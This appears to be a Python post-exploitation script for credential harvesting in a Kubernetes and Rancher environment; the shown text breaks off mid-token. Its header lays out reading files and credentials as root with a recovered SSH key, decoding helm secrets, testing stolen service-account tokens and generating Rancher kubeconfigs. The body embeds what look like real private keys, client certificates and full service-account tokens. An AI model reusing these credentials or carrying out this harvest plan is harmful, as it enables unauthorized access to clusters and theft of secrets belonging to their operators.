#!/usr/bin/env python3
# i10579 - bounded READ-ONLY harvest:
#  (1) root@10.17.1.1 (github-nmz1) file/credential read + GPU/IMDS proof via the recovered root key
#  (2) k8s API: 14 helm-release secrets decoded, workload env/args across all namespaces,
#      one SelfSubjectAccessReview per recovered SA/fleet token against https://10.96.0.1:443
#  (3) in-cluster Rancher API: one bounded bootstrap-password login, read-only cluster enumeration
#      and one generateKubeconfig per cluster
# All output is base64 in I10579B64 lines; wrapper exits 1 immediately after.
import os, sys, json, base64, gzip, hashlib, socket, ssl, http.client, subprocess, shutil, tempfile, time, re, urllib.parse

MODE = os.environ.get("I10579_MODE", "pod")
API_HOST, API_PORT = "10.17.1.1", 6443
CA_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR5RENDQXJDZ0F3SUJBZ0lVV1ZJUEFUanpHRlhsOVo0SklnQStDNGFyZmIwd0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TWpBd01EQmEKR0E4eU1USTJNVEF3TkRBeU1EQXdNRm93ZXpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1STXdFUVlEVlFRS0V3cExkV0psY201bGRHVnpNUm93CkdBWURWUVFMRXhGTGRXSmxjbTVsZEdWekxXMWhiblZoYkRFVE1CRUdBMVVFQXhNS2EzVmlaWEp1WlhSbGN6Q0MKQVNJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dFUEFEQ0NBUW9DZ2dFQkFLTXd6T0thcUk0Y3pWMWJmY2ovQmVjcgpoRWQwL0w0QVlWSlg2WkM2dDNtQ0ZLN294bE80L3RaZVVLZEF2dlZuVGJxYXBTaU96dWkwb0NpZUdIeEZ5WGJpCmUyT1U5YzNTWTZjTE1ONUtQUGszdDk0aUloVkVtMWt3dzNjcmcveWhkUHZacGlSOXpaUDFTY045aVV5RlA3V3UKKzF0cm03bjBxdFo5Z3pwbEhtRTdyNndBTVRQV24zT0xHY3JCcXRRV3BVczhDaEsxSGhnZXR5dWt5bzd4aXZrRgpZS1RjckJnTzNJYS9hOExsUkkvU01pYUJ6VDlYM1RoRzdTdHVVUktQMTBLOFFpYzlOdlora1d6dDR3L0NiMDZkCjdUZVI1V1lKYzFJbHFPRnMzYm9tM1hPT3EwcFo2REdTZkx6a2t5U0ZaU0h0L3pDUlc3dFJ5cDl5dS84OWEyc0MKQXdFQUFhTkNNRUF3RGdZRFZSMFBBUUgvQkFRREFnRUdNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdIUVlEVlIwTwpCQllFRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQmd6a010CkU4azljbHBiaXBhR203RmI1R1V1ak1qMmpzNFdyNCtZaWFYNFBlZDI4WXhYbkxLbENHUjc4a3ZxWGxMY0RKUmcKNzF3L2dUYXhxa29pdVRDeVJqVFhrQzFhZ29MaldWd1VYaTRYcVZDbjV5aXJjeGhrRjdNQ0F0TWFzNTVscW8xTwpVanhwdFdTODIrVjBYd0RxRmhuR1BhRWV5a2hIY3lwbldYZllXTUFXc0IxakFOS08zazNmaXk5NjVkODhnVFRyCkpqcGxsZVo1dE8xaTZaZFZEWmhmSGFLUGdocFVMQ01uVnVCMm9tZnZnMEVuSWtRZVNnODNoZEhzQVl5dW5iencKekR0N1F4eU50aEZhRDZoTnJpd3NvZGxYZkYvMURNeGNhWnphV3Rzak5pRzQ2T3VSVldnTllZUER3cXRKYWEybQpNYlpmaCtCY1p1QjlleXlGCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
CRT_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVCRENDQXV5Z0F3SUJBZ0lVYmpkOXlQNkkwOFNOOXpBM0sxUmZLbjkwa1h3d0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TXpJeU1EQmEKR0E4eU1USTJNVEF3TkRBek1qSXdNRm93ZWpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1SY3dGUVlEVlFRS0V3NXplWE4wWlcwNmJXRnpkR1Z5CmN6RWFNQmdHQTFVRUN4TVJTM1ZpWlhKdVpYUmxjeTF0WVc1MVlXd3hEakFNQmdOVkJBTVRCV0ZrYldsdU1JSUIKSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXRpb3o2YzFXK0pIRzVKejlFSUlKcFdkYQowV1dwYXhOYk15TERITllMZVpWMzhra1Eza1Z6MHJ2L08zUkVPdGp6M1VWZERWcmtJQ2tueXhaWTFzVURvRmtoCnpPTjg5aCs4RUpoWlY1SWxxRDdLYy9aUzd2WjdpUGRGRDFaaTl1cVNEQ2lDUng5dHBiYjFEbW84a0hzNzRIcEwKc0cxR1Q1VHlPVTFRd093Mi9VRWVsUXY4Qk1FRzNIdFlYSVMwMndYeWZpVHhPbWg5MlVma09meEgreWo3TDNZeAp3MUlabG1sRFp3UnlpK3V1ZkU4NU5GaG9DRWV6Zm5UWFptT09LZUlyYTJSZnZudDd1VGFLYTBmL0plV0ZmWGFUCmFWM252UlFEQUU1RjJacXY0elRZd0Q0QS9maEQ2Uk1XUWpXQkMvRlIvK2VuQURWanpDWUVzcGp1T2QzeTF3SUQKQVFBQm8zOHdmVEFPQmdOVkhROEJBZjhFQkFNQ0JhQXdIUVlEVlIwbEJCWXdGQVlJS3dZQkJRVUhBd0VHQ0NzRwpBUVVGQndNQ01Bd0dBMVVkRXdFQi93UUNNQUF3SFFZRFZSME9CQllFRk51Si9pTFQzNE8rMmNOTUdVazN5cTlwCitweEJNQjhHQTFVZEl3UVlNQmFBRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUIKQ3dVQUE0SUJBUUJQQnNJVVZHUGplRjVMcnJsdnJpM0RZNTRYZ0d1SlY5N0JlQ3UySFIzbVhkYW5wbkwzRHVyegpka3I1Ry85UEF6ayt6VDhVRlpqZnlDSFJjU2dncHpKYW1FcEg1THVQakVMS0JuUFJFL08zZ0l0VUh2am9IZE80CnJ4VFBSZ1krcWtnNUNXUFNpOEtRZ0cya2ZEaHVZYllwT1FsUmlXOUlaUUZoUXNvQm5naU1GaDkvTC83NnFjQ1QKcm9IVVA0VHBQNzB3M0tpN05oemdZc0NwbllmbU9UN0xWT2ptZVczaHZlbm1qZTR3VUI5cmRySTlNMWxwUEpqbwpzeUdlbHBYbkVzVmVCaldsc042NXU2WW5ITTJNVko1aXRaVUIrS2RmZWdrczNYZGIvOFcyTGJxcUxpeGNjUGZxCkEraTk4d3lNQ1BDVVRwVHZCNjF4a3Y0MkQxUDZZblRICi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
KEY_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBdGlvejZjMVcrSkhHNUp6OUVJSUpwV2RhMFdXcGF4TmJNeUxESE5ZTGVaVjM4a2tRCjNrVnowcnYvTzNSRU90anozVVZkRFZya0lDa255eFpZMXNVRG9Ga2h6T044OWgrOEVKaFpWNUlscUQ3S2MvWlMKN3ZaN2lQZEZEMVppOXVxU0RDaUNSeDl0cGJiMURtbzhrSHM3NEhwTHNHMUdUNVR5T1UxUXdPdzIvVUVlbFF2OApCTUVHM0h0WVhJUzAyd1h5ZmlUeE9taDkyVWZrT2Z4SCt5ajdMM1l4dzFJWmxtbERad1J5aSt1dWZFODVORmhvCkNFZXpmblRYWm1PT0tlSXJhMlJmdm50N3VUYUthMGYvSmVXRmZYYVRhVjNudlJRREFFNUYyWnF2NHpUWXdENEEKL2ZoRDZSTVdRaldCQy9GUi8rZW5BRFZqekNZRXNwanVPZDN5MXdJREFRQUJBb0lCQVFDV1RpNDFmT3VFLyt1SApXSTFxWUpHSys4T3d3VnhQOEZHdzJMNzYvUlhNeFdxSjdJWFJrS2JudTV6Mk5wSFJxSTlYQk5PcG9GUll3UHlICmtySE16QlNZNnRKNzF6eVZiRXZsdVg4R1JaMXl2QlNhS0NYMzdFSzBHYXJPNCsyV1pLZ0xCaVd3ZjVzZVA5N2wKZlB6cURmU3kzTlcxQmdVY3h2NHlEN3hRNHRiZ2tNTkhJc0UxUlBGTGpERUlJUUgzcGNzdnJ3SVc2ZVVMeHVGZApEOTRuUndQMHZjaGtuZVdVN3hIR0F3Z1hGaVFPR1FmZVVZREtlemFJN2JhY0ZtM2dkOG5rUng3R21sM29SREV5CnZvbVpMMnRRaFJnZEdQQWJta0duUFp0MWYyTk91c0daWnRVN3hjRE1ZYW00RGdOb1FhK2NNaUsveGhaOWlpMlEKN0RzM00yWlpBb0dCQVBBWFRCcUVMQ1VHc0E5dERNSm9MWGl5ODl5Nm51UXhSVzBtQXpGaUY2WHpuSFVVQnlqLwowUC9uT3liMEx0djFlRGlKbVl2YTJsTmlTTldYUk9zMzFEUHdLUHlLeU1YSkdkUGxxbHFyelBmMURNWHdlMjZnCkpiWm1FTzBtYldIa25ueVNKb0FuUzVBYk10aGg5RjI2TGhSWDJDT2RTUXNNL241R2lWMDljUXVWQW9HQkFNSTgKUzNpSlJ3dUtjcEdSK1N1ZXVrdldQL04vWjNPaURlMEhyODZlZFlrQi9hVWlsbFNYOUlQWFFEMmZKQWJKT2dYSApPWHFxL0p5OVpjQjZnRUtJNURJSzdaVE1ZanR4Y2NGZERNdFp1VDRGMlFuTzZMQW1YVVJRdXlPdzR1aCtVSmlLCk4zUzA3eTFEYUt6V01oT08zYmc3NjFTTUNSWW5KL2NCUEQzMHlVbTdBb0dCQUs2dUpKNitQMmdJLzV1Wm1jancKQnZWa0xlMFFrbjR3SXZVUXpRM204cEc1TnNJditpMm9RaVdOMVFtNGEwZDV4eWhMWkwzT1V6NkxxYlpOUXNWbwpieW9DdDY5V1FsRTB5V2ZVRnllMUM0SDBkb0NsUVFqeDE3NW5jRFU2MmlaNU1aNHNyM3BhSEs0U08rSVhFcllHCnVYUHZuYi83dGFNbXB4cTBzMGgxWllRcEFvR0FXSTlYTmRFWmxIaCtma0xaSWZ0UUk2Mi9JTTJSSkpiWjFKM3gKbWJxRUNvRGUza0VqMjlRZ3gxQUlXVkJMQTlFUjVIcU9pWkNXZHZ5Zi9SK2RoVGlYR3Y0Q2p4cVZHMWRCTDVHMgplSzBqR2RWZXZPc2JDdDJqSHJmVWE1U0dFTTB2QUMzYzFSaCtDTnc0U0wyc3ZXQWhWWlAwVzJzeDVXamEvdk1RClBZdHpqMnNDZ1lBUis2UUVXVm1waHdzRFJtenpjV0xIUzFrZ2dKTTNlWWVUNG1GTXhDZi9IRTcwR0J3a1RsOUcKWXJiMWV0d3pJWnpOYXJoYXpXZ0Z6LzUzU2VqbHpzOTcrcE1nZzRoWDQwTG03UytORXZ6dy9TbEtWenN0anNHNgorQTJpZ09tazNPMTlBbkJOVzJxRmNNR3h0a2ZKMmQ0Sm9TZDRDTlI2T2FsWXJPQ1ZrN2pDcFE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo="
ROOTKEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEwaUhpT0JXaVFmMVFDMTJ1ZnJGcTRJSndCaHhQSEx0MGJmbnIrTDBLbTRFeVZwNVVRNGwyCk5oejlhRlA3QTZ1THVVRTVTWTk5VENJSlZJOXFOYU9maHdCN3RvTTlma3ppbFJIZVdHSTlBT1dSRlZqSkwwY0pENVBiOEwKNzA2NkxQaGZ4OXZlNmM3MFpkQzdubjh5SU8rRS9nTTNTcjZwZ1FHbHhtWGl1aTRIMXdyNWxmTkwyckVndm5UOTJ4VHVnegpRRS8yT2w3TnBFV2YwYWZNakxBblZQMlAwN0NscGExem1DdVl1TlhUS2xSRHFMdU1zOFpQNXZwdUlQcHJkY2xzTjdNLzZGCml3c2hkUXc5NkZnQzEvWG8yMGM2UjFHRkdTSnB2Y0J3bExBVHhHd00zaDAvZUtadmVDeTNXT2s5Y1VWUjB3OHRjczFUelgKcGFOanVWM1EwSnkxeWdGdkVRc0xLZ0c0N3RDRFNwTzBpSEkxS2l4M21KMm5KcW9BYi8wVGRtM010TlpOWWxsbWhEYVRoMwpGa1BPUGRDL05HbTBvdWg5Q1FYVEFWMFd6aVl0L25maEVYUnJzTzlwNW5YTDlwL1hYN0lCNTVsQUJYazhXV09nTWhGSDdTCjZJcThjRDhVV0V5My9CTi9oNXRmT3dCVlI0TWgrMEdMSzZQYUFKKzdBQUFGaUNsb0ljOHBhQ0hQQUFBQUIzTnphQzF5YzIKRUFBQUdCQU5JaDRqZ1Zva0g5VUF0ZHJuNnhhdUNDY0FZY1R4eTdkRzM1Ni9pOUNwdUJNbGFlVkVPSmRqWWMvV2hUK3dPcgppN2xCT1VtUGZVd2lDVlNQYWpXam40Y0FlN2FEUFg1TTRwVVIzbGhpUFFEbGtSVll5UzlIQ1ErVDIvQys5T3VpejRYOGZiCjN1bk85R1hRdTU1L01pRHZoUDRETjBxK3FZRUJwY1psNHJvdUI5Y0srWlh6UzlxeElMNTAvZHNVN29NMEJQOWpwZXphUkYKbjlHbnpJeXdKMVQ5ajlPd3BhV3RjNWdybUxqVjB5cFVRNmk3akxQR1QrYjZiaUQ2YTNYSmJEZXpQK2hZc0xJWFVNUGVoWQpBdGYxNk50SE9rZFJoUmtpYWIzQWNKU3dFOFJzRE40ZFAzaW1iM2dzdDFqcFBYRkZVZE1QTFhMTlU4MTZXalk3bGQwTkNjCnRjb0JieEVMQ3lvQnVPN1FnMHFUdEloeU5Tb3NkNWlkcHlhcUFHLzlFM1p0ekxUV1RXSlpab1EyazRkeFpEemozUXZ6UnAKdEtMb2ZRa0Ywd0ZkRnM0bUxmNTM0UkYwYTdEdmFlWjF5L2FmMTEreUFlZVpRQVY1UEZsam9ESVJSKzB1aUt2SEEvRkZoTQp0L3dUZjRlYlh6c0FWVWVESWZ0Qml5dWoyZ0NmdXdBQUFBTUJBQUVBQUFHQkFNaFQwMFhpb2dqRlJWMUFsNDFpK09CR21pClBKTTBiU0V5S1JnL3hqeE13UmRIc05nSW5PYitzUTRpbG0vc1ExOUFQT0FaNTJkRjV6aUcrY05nWWpFbi95M3Y1VnlmY3gKdDBXa2ZsUEdmQi94dThvZEZkZkRvZ2krem95S2tCWmc1ZlQzakt6WTRiWmZYMjlCY2JiaC9tR09UTkRoWnRCRTNmMHpuOApnaFU2c3ZDNUhzNXMzeUVEZ3BMd0Y5K1g2ZmNkVGJKb1BwUTZWYlZ3emFLdkRwTXVZY3dkUnY4TXV0TzZtVHpvcFFGM3VnClQ4eDUySjYrN2dmbk1ieXc0R2V2ZUlpbW5sbGR1aGRrL0FhL1B4YlF1bEVxWnVhVXp1SmlGMGlvYjM1ZEJyS0l0V0VLQ0sKazBUR3g3dDJFV0lac09oRHQwNjlHaTRseFJYcHRpekVoZUd5SUl1Q0IyVG9oZG9talN3MG9PSWI2WnZTQ0tISW8yV25zYwo2amJXOWJjM2JQNW10NDBKeFVMeUphdVh0cWV2SkRIcUcwRE5TNWJLaWJlaE81UGlBM2dRNGM1dGVFUG4rakN5R2ZuWTQ2CkVKR3VGUy95S1RIMlZXOUgrbVprQk5wblhYTERSMmJ6ZmNRbFVYMm55REh0b3dlbU9vQjJhbWF0dllvb2QwTDhuNm1RQUEKQU1FQWhkajFJN0VCTGpkVnIvVDJNNlkzbmFxMmU0NWZORDNQTXppQWRrdkJuZXJGUHZubkd3eDBlK0lnVXAxRnZCYUpEZwpUM09tYlo1bXhlWG5VUG1xVG1MbkhlVGUvNzNhZEJXeDZaRFhHUU80TFJ4TXN4blNmL2xDR3dqTGxBWlBFQWQyS0RmZTZICk1ZZHJwVXZreVpkTkZ4NTJNekpVV3N0UzMrVnh5NjRxemFKQkNKSjVCKzFEQXFmOHl5Y0V3ZkFxN09iR3RjbVNDNHZrSFYKNUZReUZVQTNiMk9zNHdITG5mUHpZS1o5VzhlQjM1VmF1WFhCNk5LcSs4VlFya1BnTmtBQUFBd1FEc1JuU2NneGlDWEQvNApDM0JoeFJPQXM0OFJKRjlJZk14dEI0YWRFMUhYY2dZVk1idWNMS0RsZkplUDlCSzRod1JyMWdmdW02U3pqaE45NjUwS3d3Clg3UGJNTzVTTE01YjMzVTMvSnVBdWRHOVF2V05WWlladlRYejU2R1UxWGNJajc3OEpuQVhDZHN1Nzc5Yld6bjFZeUhMR0sKalRGdnpsZ3hkZUJyMnF5eVN6T3pZU1ovSDU1WGxBOUhqL1I0RVlpZ28vaDNmV3BZYVQ4VCtWaWF6RGJ0cFczdDI2dWkyVApKcFdOSGJ2UWFWUXZGTGxEdkN2ZjdhMmZHRjIybkpsYmNBQUFEQkFPT3N0NkQrY1lYcUpaZHJBR2tQQ21jYVpZL2lVbTZHCjJJRVU5Q3JuZCtTUEljWG52U29SQzFyb0tOdVlyaW5iNUdPV2orbGpRNWdMY2ZKR0xYMFlMcXBkbk9Db09TMklGeGt5d2EKcUllbkhHbEhPQmQ4SmovS1ZiTzRyZ09qYmdqNVdqZnB2c0RXT0lWaDEzU252dnpXT3RkRUU0SkN5UnE0c3JiV0pyTnlaUgpJbld4T3hGR0g3SFZlb3hIU1NFSDA0Y3dEMGZIUklWMzlOQUxuSFB0RnM2YkFmSjNTeCtKUUJUY1k5RGlFSUhpSk55eEFsClpGQ2ZGcCtKVmNvWnFtSFFBQUFBcHliMjkwUUVKWExUSXlBUUlEQkFVR0J3PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg=="
SA_TOKENS = {"id": "A-9872-hygon-k8s-sa-tokens", "type": "k8s-service-account-tokens", "tokens": {"arc-runners/cluster-manager-st-ci-token": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhcmMtcnVubmVycyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVyLW1hbmFnZXItc3QtY2ktdG9rZW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiY2x1c3Rlci1tYW5hZ2VyLXN0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYWMyMDE0MWMtOTkxMi00MDUxLWEzY2UtNTMzNDQ4NTQwN2VmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmFyYy1ydW5uZXJzOmNsdXN0ZXItbWFuYWdlci1zdCJ9.QaEJxXnvXuyJUlX83z_1bzNIQwc4LBBeOcjcvRe4OnAwuoGspctGQ0GVSaYgwBvu4F_HHFLwvnFDY9mF0VMs4sBLA0lN2FimEzP06_zCX9wOUcsz4tfo6CO_ZnmleX8A2aGw6l1sLlyM3tOWjtAZdvXxET1emV71KTcSMg39QY2pdndRAJYt7eYMqr8KT_s_906JKTWaxFAKXwYVt7vKZO4hkz6-LsJE7c0Ba8bIuJPMf_pl1DMd_zLm43D4Ooqiws2ViG9zvxUUvZuiSqxBd8-Dsib5lhbsFjpXxU41uHdBjh6Oq_Qz6J7YWnfICBGEou-gfjWMBs41l51oln4Rgw", "namespace": "arc-runners", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}, "cattle-impersonation-system/cattle-impersonation-u-b4qkhsnliz-token-kz6p5": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtaW1wZXJzb25hdGlvbi1zeXN0ZW0iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2F0dGxlLWltcGVyc29uYXRpb24tdS1iNHFraHNubGl6LXRva2VuLWt6NnA1Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNhdHRsZS1pbXBlcnNvbmF0aW9uLXUtYjRxa2hzbmxpeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjUwNWE5MzE5LTIwNzYtNDgxNC1hMTY5LTRlODllZjMyMDU5YSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXR0bGUtaW1wZXJzb25hdGlvbi1zeXN0ZW06Y2F0dGxlLWltcGVyc29uYXRpb24tdS1iNHFraHNubGl6In0.PjNbZhCEHUGOMM3Jyy1J94ZdFPKqZlmbNii1KLqceysbj8ukIOJGGTqDfEtKPq1VOieY5nmiUPDIZdYry72UYnjM2vLKDdSL1jcew5YVucry3eEIZOwkwbuCiiS1_RyDeQX9N1bWfvqpJWj1FzBSkbM04cWkrgN5GyrMnm5QXV1XHE11hv-8gW-0qOZXoHCG1vn8NudHvuz_n2-mLhgcfNnFEodqQaSommdlk3dPJ9pKQ3EKvuFpYuqymiA3OKqHtDKc5CnzlV5g9m1xdXnccnHshHAQVmqL1wTsaULrVN41C59zuthC8Oh-MJcDD1U8ZF128fdhTZx7yGlkvBXrDQ", "namespace": "cattle-impersonation-system", "ca.crt": "-----BEGIN CERTIFICATE-----\nMIIDyDCCArCgAwIBAgIUWVIPATjzGFXl9Z4JIgA+C4arfb0wDQYJKoZIhvcNAQEL\nBQAwezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5nWmhvdTESMBAGA1UEBxMJ\nWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRowGAYDVQQLExFLdWJlcm5l\ndGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczAgFw0yNjEwMjgwMjAwMDBa\nGA8yMTI2MTAwNDAyMDAwMFowezELMAkGA1UEBhMCQ04xEjAQBgNVBAgTCVpoZW5n\nWmhvdTESMBAGA1UEBxMJWmhlbmdaaG91MRMwEQYDVQQKEwpLdWJlcm5ldGVzMRow\nGAYDVQQLExFLdWJlcm5ldGVzLW1hbnVhbDETMBEGA1UEAxMKa3ViZXJuZXRlczCC\nASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKMwzOKaqI4czV1bfcj/Becr\nhEd0/L4AYVJX6ZC6t3mCFK7oxlO4/tZeUKdAvvVnTbqapSiOzui0oCieGHxFyXbi\ne2OU9c3SY6cLMN5KPPk3t94iIhVEm1kww3crg/yhdPvZpiR9zZP1ScN9iUyFP7Wu\n+1trm7n0qtZ9gzplHmE7r6wAMTPWn3OLGcrBqtQWpUs8ChK1Hhgetyukyo7xivkF\nYKTcrBgO3Ia/a8LlRI/SMiaBzT9X3ThG7StuURKP10K8Qic9NvZ+kWzt4w/Cb06d\n7TeR5WYJc1IlqOFs3bom3XOOq0pZ6DGSfLzkkySFZSHt/zCRW7tRyp9yu/89a2sC\nAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0O\nBBYEFO/JE0pqppI4fAKeVlcQHOt/5MEiMA0GCSqGSIb3DQEBCwUAA4IBAQBgzkMt\nE8k9clpbipaGm7Fb5GUujMj2js4Wr4+YiaX4Ped28YxXnLKlCGR78kvqXlLcDJRg\n71w/gTaxqkoiuTCyRjTXkC1agoLjWVwUXi4XqVCn5yircxhkF7MCAtMas55lqo1O\nUjxptWS82+V0XwDqFhnGPaEeykhHcypnWXfYWMAWsB1jANKO3k3fiy965d88gTTr\nJjplleZ5tO1i6ZdVDZhfHaKPghpULCMnVuB2omfvg0EnIkQeSg83hdHsAYyunbzw\nzDt7QxyNthFaD6hNriwsodlXfF/1DMxcaZzaWtsjNiG46OuRVWgNYYPDwqtJaa2m\nMbZfh+BcZuB9eyyF\n-----END CERTIFICATE-----\n"}, "cattle-impersonation-system/cattle-impersonation-u-mo773yttt4-token-hgmmx": {"token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJCRzRfd3RmdnJjMjlGX2w1T0ZTaGlqb1lPbHowNDIxeDhOZFU3cnhQdWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtaW1wZXJzb25hdGlvbi1zeXN0ZW0iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2F0dGxlLWltcGVyc29uYXRpb24tdS1tbzc3M3l0dHQ0LXRva2VuLWhnbW14Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNhdHRsZS1pbXBlcnNvbmF0aW9uLXUtbW83NzN5dHR0NCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjU0NzFmNjRjLTlmYTEtNDE3MS05N2ZmLTZjMWY4MTcwZTVmZSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXR0bGUtaW1wZXJzb25hdGl